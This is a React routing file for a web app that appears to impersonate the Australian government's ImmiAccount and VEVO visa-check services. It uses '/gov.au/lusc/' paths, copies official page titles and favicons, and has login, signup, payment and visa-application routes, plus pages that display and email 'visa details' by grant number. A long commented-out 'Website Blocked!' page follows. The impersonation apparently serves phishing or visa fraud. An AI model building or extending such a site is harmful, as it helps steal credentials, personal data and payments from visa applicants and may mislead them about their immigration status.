import React, { useEffect } from "react";
import {
  BrowserRouter as Router,
  Routes,
  Route,
  Navigate,
  useLocation,
} from "react-router-dom";

import Header from "./components/Header";
import LoginPage from "./components/Login";
import Footer from "./components/Footer";
import SignUp from "./components/SignUp";
import VerificationCode from "./components/VerificationComponent";
import AccountDetails from "./components/AccountDetailsPage";
import SignupSuccessful from "./components/SignupSucessfull";
import Dashboard from "./components/Dashboard";
import NewApplication from "./components/Feilds";
import SkillsInDemandVerification from "./components/TermsAndConditions";
import SubmitForm from "./components/NewApplication";
import PaymentComponet from "./components/PaymentComponet";
import VisaCheck from "./components/VEVO/VisaCheck";
import VisaDetails from "./components/VEVO/VisaDetails";
import SendMail from "./components/VEVO/SendMail";

import immiFavicon from "./assets/Group 44 (1).png";
import vevoFavicon from "./assets/blueFavicon.png";

const AppContent = () => {
  const location = useLocation();
  const token = localStorage.getItem("authToken");

  // Hide header/footer on VEVO routes
  const hideHeaderFooter =
    location.pathname === "/gov.au/lusc/visaCheck" ||
    location.pathname.startsWith("/gov.au/lusc/userData") ||
    location.pathname.startsWith("/gov.au/lusc/mailSendtoEmail");

  // Dynamically change title + favicon
  useEffect(() => {
    let title = "ImmiAccount";
    let favicon = immiFavicon;

    if (location.pathname === "/gov.au/lusc/visaCheck") {
      title = "Visa Entitlement Verification Online: Visa holder enquiry";
      favicon = vevoFavicon;
    } else if (location.pathname.startsWith("/gov.au/lusc/userData")) {
      title = "Visa Entitlement Verification Online: Visa details";
      favicon = vevoFavicon;
    } else if (location.pathname.startsWith("/gov.au/lusc/mailSendtoEmail")) {
      title = "Visa Entitlement Verification Online: Send Email";
      favicon = vevoFavicon;
    }

    document.title = title;

    const faviconEl = document.querySelector("link[rel='icon']");
    if (faviconEl) {
      faviconEl.href = favicon;
    }
  }, [location.pathname]);

  return (
    <>
      {!hideHeaderFooter && <Header />}
      <Routes>
        {/* Public Routes */}
        <Route path="/gov.au/lusc/lgin" element={<LoginPage />} />
        <Route path="/gov.au/lusc/signup" element={<SignUp />} />
        <Route path="/gov.au/lusc/register" element={<VerificationCode />} />
        <Route path="/gov.au/lusc/create-account" element={<AccountDetails />} />
        <Route path="/gov.au/lusc/successful" element={<SignupSuccessful />} />

        {/* VEVO Public Routes */}
        <Route path="/gov.au/lusc/visaCheck" element={<VisaCheck />} />
        <Route
          path="/gov.au/lusc/userData/:visaGrantNumber"
          element={<VisaDetails />}
        />
        <Route
          path="/gov.au/lusc/mailSendtoEmail/:visaGrantNumber"
          element={<SendMail />}
        />

        {/* Protected Routes */}
        <Route
          path="/gov.au/lusc/dashboard"
          element={
            token ? <Dashboard /> : <Navigate to="/gov.au/lusc/lgin" replace />
          }
        />
        <Route
          path="/gov.au/lusc/new-application"
          element={
            token ? <NewApplication /> : <Navigate to="/gov.au/lusc/lgin" replace />
          }
        />
        <Route
          path="/gov.au/lusc/payment"
          element={
            token ? <PaymentComponet /> : <Navigate to="/gov.au/lusc/lgin" replace />
          }
        />
        <Route
          path="/gov.au/lusc/verify-user"
          element={
            token ? <SkillsInDemandVerification /> : <Navigate to="/gov.au/lusc/lgin" replace />
          }
        />
        <Route
          path="/gov.au/lusc/submit-form"
          element={
            token ? <SubmitForm /> : <Navigate to="/gov.au/lusc/lgin" replace />
          }
        />

        {/* Catch-all fallback route */}
        <Route path="*" element={<Navigate to="/gov.au/lusc/lgin" replace />} />
      </Routes>
      {!hideHeaderFooter && <Footer />}
    </>
  );
};

const App = () => {
  return (
    <Router>
      <AppContent />
    </Router>
  );
};

export default App;


// import React, { useState, useEffect } from 'react';

// const App = () => {
//   const [tears, setTears] = useState([]);
//   const [heartBreaks, setHeartBreaks] = useState([]);

//   // Generate random tears animation
//   useEffect(() => {
//     const generateTears = () => {
//       const newTears = Array.from({ length: 8 }, (_, i) => ({
//         id: i,
//         left: Math.random() * 100,
//         delay: Math.random() * 3,
//         duration: 1.5 + Math.random() * 4
//       }));
//       setTears(newTears);
//     };

//     const generateHeartBreaks = () => {
//       const newHeartBreaks = Array.from({ length: 3 }, (_, i) => ({
//         id: i,
//         left: Math.random() * 100,
//         delay: Math.random() * 2,
//         duration: 3 + Math.random() * 2
//       }));
//       setHeartBreaks(newHeartBreaks);
//     };

//     generateTears();
//     generateHeartBreaks();
//     const tearsInterval = setInterval(generateTears, 4000);
//     const heartInterval = setInterval(generateHeartBreaks, 6000);
    
//     return () => {
//       clearInterval(tearsInterval);
//       clearInterval(heartInterval);
//     };
//   }, []);

//   const styles = {
//     blockedContainer: {
//       minHeight: '100vh',
//       background: 'linear-gradient(135deg, #4a5568 0%, #2d3748 50%, #1a202c 100%)',
//       display: 'flex',
//       justifyContent: 'center',
//       alignItems: 'center',
//       position: 'relative',
//       animation: 'sadPulse 5s ease-in-out infinite',
//       fontFamily: "'Arial', sans-serif",
//       margin: 0,
//       padding: 0,
//       boxSizing: 'border-box',
//       overflow: 'hidden'
//     },

//     animationsContainer: {
//       position: 'fixed',
//       top: 0,
//       left: 0,
//       width: '100%',
//       height: '100%',
//       pointerEvents: 'none',
//       zIndex: 1
//     },

//     tear: {
//       position: 'absolute',
//       top: '-50px',
//       fontSize: '24px',
//       animation: 'tearFall linear infinite',
//       opacity: 0.8
//     },

//     heartBreak: {
//       position: 'absolute',
//       top: '-50px',
//       fontSize: '30px',
//       animation: 'heartFall linear infinite',
//       opacity: 0.6
//     },

//     rainCloud: {
//       position: 'absolute',
//       top: '10%',
//       fontSize: '40px',
//       animation: 'cloudFloat 8s ease-in-out infinite',
//       opacity: 0.7
//     },

//     content: {
//       background: 'rgba(255, 255, 255, 0.95)',
//       padding: '3rem',
//       borderRadius: '30px',
//       textAlign: 'center',
//       boxShadow: '0 30px 80px rgba(0, 0, 0, 0.5)',
//       maxWidth: '700px',
//       width: '90%',
//       position: 'relative',
//       zIndex: 2,
//       animation: 'dramaticFloat 4s ease-in-out infinite',
//       border: '3px solid #e2e8f0'
//     },

//     cryingHeader: {
//       display: 'flex',
//       justifyContent: 'center',
//       alignItems: 'center',
//       gap: '1rem',
//       marginBottom: '2rem'
//     },

//     mainCryingEmoji: {
//       fontSize: '8rem',
//       animation: 'dramaticBounce 2s ease-in-out infinite',
//       filter: 'drop-shadow(0 0 10px rgba(231, 76, 60, 0.5))'
//     },

//     sideCryingEmoji: {
//       fontSize: '4rem',
//       animation: 'sideCry 3s ease-in-out infinite'
//     },

//     blockedTitle: {
//       color: '#e53e3e',
//       fontSize: '3.5rem',
//       marginBottom: '1rem',
//       textShadow: '3px 3px 6px rgba(0, 0, 0, 0.4)',
//       animation: 'dramaticShake 2s ease-in-out infinite',
//       margin: '0 0 1rem 0',
//       fontWeight: 'bold'
//     },

//     sadSubtitle: {
//       color: '#c53030',
//       fontSize: '1.8rem',
//       marginBottom: '2rem',
//       animation: 'sadPulse 3s ease-in-out infinite',
//       margin: '0 0 2rem 0',
//       fontStyle: 'italic'
//     },

//     cryingMessage: {
//       marginBottom: '2.5rem',
//       fontSize: '1.4rem',
//       color: '#2d3748',
//       lineHeight: 1.8,
//       position: 'relative'
//     },

//     sadText: {
//       display: 'block',
//       margin: '1rem 0',
//       position: 'relative'
//     },

//     inlineEmoji: {
//       margin: '0 0.5rem',
//       animation: 'emojiWiggle 1.5s ease-in-out infinite',
//       display: 'inline-block',
//       fontSize: '1.5rem'
//     },

//     massiveCryingSection: {
//       margin: '3rem 0',
//       display: 'grid',
//       gridTemplateColumns: 'repeat(auto-fit, minmax(80px, 1fr))',
//       gap: '1.5rem',
//       padding: '2rem',
//       background: 'linear-gradient(45deg, #f7fafc, #edf2f7)',
//       borderRadius: '20px',
//       border: '2px dashed #cbd5e0'
//     },

//     cryFace: {
//       fontSize: '3rem',
//       animation: 'intenseCry infinite',
//       textAlign: 'center',
//       transition: 'transform 0.3s ease'
//     },

//     cry1: { animationDuration: '1.2s', animationDelay: '0s' },
//     cry2: { animationDuration: '1.8s', animationDelay: '0.2s' },
//     cry3: { animationDuration: '1.5s', animationDelay: '0.4s' },
//     cry4: { animationDuration: '2s', animationDelay: '0.6s' },
//     cry5: { animationDuration: '1.7s', animationDelay: '0.8s' },
//     cry6: { animationDuration: '1.3s', animationDelay: '1s' },
//     cry7: { animationDuration: '1.9s', animationDelay: '0.3s' },
//     cry8: { animationDuration: '1.6s', animationDelay: '0.7s' },

//     dramaticSection: {
//       margin: '2.5rem 0',
//       padding: '2rem',
//       background: 'rgba(254, 178, 178, 0.3)',
//       borderRadius: '15px',
//       border: '2px solid #feb2b2'
//     },

//     bigSadText: {
//       fontSize: '2rem',
//       color: '#e53e3e',
//       fontWeight: 'bold',
//       animation: 'textCry 2.5s ease-in-out infinite',
//       textShadow: '2px 2px 4px rgba(229, 62, 62, 0.3)'
//     },

//     sadQuotes: {
//       fontStyle: 'italic',
//       color: '#718096',
//       fontSize: '1.2rem',
//       margin: '1.5rem 0',
//       animation: 'quoteFade 4s ease-in-out infinite'
//     },

//     footerCrying: {
//       marginTop: '3rem',
//       paddingTop: '2rem',
//       borderTop: '3px dashed #e2e8f0',
//       animation: 'footerSob 3s ease-in-out infinite'
//     },

//     finalCryMessage: {
//       fontSize: '1.5rem',
//       color: '#e53e3e',
//       fontWeight: 'bold',
//       margin: '1rem 0'
//     }
//   };

//   // Add keyframes to document head
//   useEffect(() => {
//     const styleSheet = document.createElement("style");
//     styleSheet.innerText = `
//       @keyframes sadPulse {
//         0%, 100% { background: linear-gradient(135deg, #4a5568 0%, #2d3748 50%, #1a202c 100%); }
//         50% { background: linear-gradient(135deg, #2d3748 0%, #1a202c 50%, #4a5568 100%); }
//       }
      
//       @keyframes tearFall {
//         0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
//         10% { opacity: 0.8; }
//         90% { opacity: 0.8; }
//         100% { transform: translateY(100vh) rotate(180deg); opacity: 0; }
//       }
      
//       @keyframes heartFall {
//         0% { transform: translateY(-50px) scale(1) rotate(0deg); opacity: 0; }
//         15% { opacity: 0.6; }
//         50% { transform: translateY(50vh) scale(1.2) rotate(180deg); }
//         85% { opacity: 0.6; }
//         100% { transform: translateY(100vh) scale(0.8) rotate(360deg); opacity: 0; }
//       }
      
//       @keyframes cloudFloat {
//         0%, 100% { transform: translateX(-10px) translateY(0px); }
//         50% { transform: translateX(10px) translateY(-5px); }
//       }
      
//       @keyframes dramaticFloat {
//         0%, 100% { transform: translateY(0px) scale(1); }
//         50% { transform: translateY(-15px) scale(1.02); }
//       }
      
//       @keyframes dramaticBounce {
//         0%, 20%, 50%, 80%, 100% { transform: translateY(0) scale(1); }
//         40% { transform: translateY(-30px) scale(1.1); }
//         60% { transform: translateY(-15px) scale(1.05); }
//       }
      
//       @keyframes sideCry {
//         0%, 100% { transform: rotate(-10deg) scale(1); opacity: 1; }
//         25% { transform: rotate(10deg) scale(1.2); opacity: 0.7; }
//         50% { transform: rotate(-5deg) scale(0.9); opacity: 0.5; }
//         75% { transform: rotate(5deg) scale(1.1); opacity: 0.8; }
//       }
      
//       @keyframes dramaticShake {
//         0%, 100% { transform: translateX(0) scale(1); }
//         10% { transform: translateX(-8px) scale(1.02); }
//         20% { transform: translateX(8px) scale(0.98); }
//         30% { transform: translateX(-6px) scale(1.01); }
//         40% { transform: translateX(6px) scale(0.99); }
//         50% { transform: translateX(-4px) scale(1); }
//       }
      
//       @keyframes emojiWiggle {
//         0%, 100% { transform: rotate(-5deg) scale(1); }
//         25% { transform: rotate(5deg) scale(1.1); }
//         50% { transform: rotate(-3deg) scale(0.9); }
//         75% { transform: rotate(3deg) scale(1.05); }
//       }
      
//       @keyframes intenseCry {
//         0%, 100% { transform: scale(1) rotate(0deg) translateY(0px); opacity: 1; }
//         15% { transform: scale(1.3) rotate(-8deg) translateY(-5px); opacity: 0.8; }
//         30% { transform: scale(0.8) rotate(8deg) translateY(3px); opacity: 0.6; }
//         45% { transform: scale(1.2) rotate(-5deg) translateY(-3px); opacity: 0.9; }
//         60% { transform: scale(0.9) rotate(5deg) translateY(2px); opacity: 0.7; }
//         75% { transform: scale(1.1) rotate(-3deg) translateY(-2px); opacity: 0.85; }
//       }
      
//       @keyframes textCry {
//         0%, 100% { transform: scale(1); color: #e53e3e; }
//         25% { transform: scale(1.05); color: #c53030; }
//         50% { transform: scale(0.95); color: #e53e3e; }
//         75% { transform: scale(1.02); color: #fc8181; }
//       }
      
//       @keyframes quoteFade {
//         0%, 100% { opacity: 1; transform: translateY(0px); }
//         50% { opacity: 0.6; transform: translateY(-3px); }
//       }
      
//       @keyframes footerSob {
//         0%, 100% { transform: scale(1); }
//         33% { transform: scale(1.03); }
//         66% { transform: scale(0.97); }
//       }

//       /* Mobile responsive styles */
//       @media (max-width: 768px) {
//         .content { padding: 2rem 1.5rem !important; margin: 1rem !important; }
//         .main-crying-emoji { font-size: 6rem !important; }
//         .blocked-title { font-size: 2.5rem !important; }
//         .cry-face { font-size: 2rem !important; }
//         .side-crying-emoji { font-size: 3rem !important; }
//       }
      
//       @media (max-width: 480px) {
//         .blocked-title { font-size: 2rem !important; }
//         .sad-subtitle { font-size: 1.4rem !important; }
//         .crying-message { font-size: 1.1rem !important; }
//         .big-sad-text { font-size: 1.5rem !important; }
//       }
//     `;
//     document.head.appendChild(styleSheet);

//     return () => {
//       if (document.head.contains(styleSheet)) {
//         document.head.removeChild(styleSheet);
//       }
//     };
//   }, []);

//   return (
//     <div style={styles.blockedContainer}>
//       {/* Animated elements background */}
//       <div style={styles.animationsContainer}>
//         {/* Rain clouds */}
//         <div style={{...styles.rainCloud, left: '15%', animationDelay: '0s'}}>☁️</div>
//         <div style={{...styles.rainCloud, left: '70%', animationDelay: '2s'}}>⛈️</div>
//         <div style={{...styles.rainCloud, left: '45%', animationDelay: '4s'}}>🌧️</div>

//         {/* Falling tears */}
//         {tears.map(tear => (
//           <div 
//             key={tear.id}
//             style={{
//               ...styles.tear,
//               left: `${tear.left}%`,
//               animationDelay: `${tear.delay}s`,
//               animationDuration: `${tear.duration}s`
//             }}
//           >
//             💧
//           </div>
//         ))}

//         {/* Falling broken hearts */}
//         {heartBreaks.map(heart => (
//           <div 
//             key={heart.id}
//             style={{
//               ...styles.heartBreak,
//               left: `${heart.left}%`,
//               animationDelay: `${heart.delay}s`,
//               animationDuration: `${heart.duration}s`
//             }}
//           >
//             💔
//           </div>
//         ))}
//       </div>

//       {/* Main content */}
//       <div style={styles.content} className="content">
//         {/* Crying header with multiple emojis */}
//         <div style={styles.cryingHeader}>
//           <div style={styles.sideCryingEmoji} className="side-crying-emoji">😿</div>
//           <div style={styles.mainCryingEmoji} className="main-crying-emoji">😭</div>
//           <div style={styles.sideCryingEmoji} className="side-crying-emoji">😢</div>
//         </div>

//         {/* Main heading */}
//         <h1 style={styles.blockedTitle} className="blocked-title">
//           Website Blocked!
//         </h1>

//         {/* Subtitle */}
//         <h2 style={styles.sadSubtitle} className="sad-subtitle">
//           So Sorry... So Very Sorry...
//         </h2>

//         {/* Crying message */}
//         <div style={styles.cryingMessage} className="crying-message">
//           <div style={styles.sadText}>
//             <span style={styles.inlineEmoji}>😢</span>
//             Your website is currently unavailable and we're absolutely heartbroken about it
//             <span style={styles.inlineEmoji}>😢</span>
//           </div>
//           <div style={styles.sadText}>
//             <span style={styles.inlineEmoji}>😭</span>
//             We're crying rivers because we can't serve you right now
//             <span style={styles.inlineEmoji}>😭</span>
//           </div>
//           <div style={styles.sadText}>
//             <span style={styles.inlineEmoji}>💔</span>
//             This makes us sadder than a rainy day without an umbrella
//             <span style={styles.inlineEmoji}>💔</span>
//           </div>
//         </div>

//         {/* Massive crying section */}
//         <div style={styles.massiveCryingSection}>
//           <span style={{...styles.cryFace, ...styles.cry1}} className="cry-face">😭</span>
//           <span style={{...styles.cryFace, ...styles.cry2}} className="cry-face">😿</span>
//           <span style={{...styles.cryFace, ...styles.cry3}} className="cry-face">😢</span>
//           <span style={{...styles.cryFace, ...styles.cry4}} className="cry-face">😰</span>
//           <span style={{...styles.cryFace, ...styles.cry5}} className="cry-face">😭</span>
//           <span style={{...styles.cryFace, ...styles.cry6}} className="cry-face">😞</span>
//           <span style={{...styles.cryFace, ...styles.cry7}} className="cry-face">😔</span>
//           <span style={{...styles.cryFace, ...styles.cry8}} className="cry-face">🥺</span>
//         </div>

//         {/* Dramatic section */}
//         <div style={styles.dramaticSection}>
//           <div style={styles.bigSadText} className="big-sad-text">
//             We're Having a Emotional Breakdown! 😭💔
//           </div>
//           <div style={styles.sadQuotes}>
//             "Sometimes websites cry too..." - Anonymous Web Developer 😿
//           </div>
//           <div style={styles.sadQuotes}>
//             "404 - Happiness Not Found" 😢💔
//           </div>
//         </div>

//         {/* Footer crying */}
//         <div style={styles.footerCrying}>
//           <div style={styles.finalCryMessage}>
//             We're sobbing uncontrollably right now! 😭😭😭
//           </div>
//           <div style={{fontSize: '1.2rem', color: '#718096', fontStyle: 'italic'}}>
//             Please forgive us for making you see this sad, sad page... 🥺💔😿
//           </div>
//           <div style={{fontSize: '3rem', margin: '1rem 0'}}>
//             😭💔😭💔😭💔😭
//           </div>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default App;
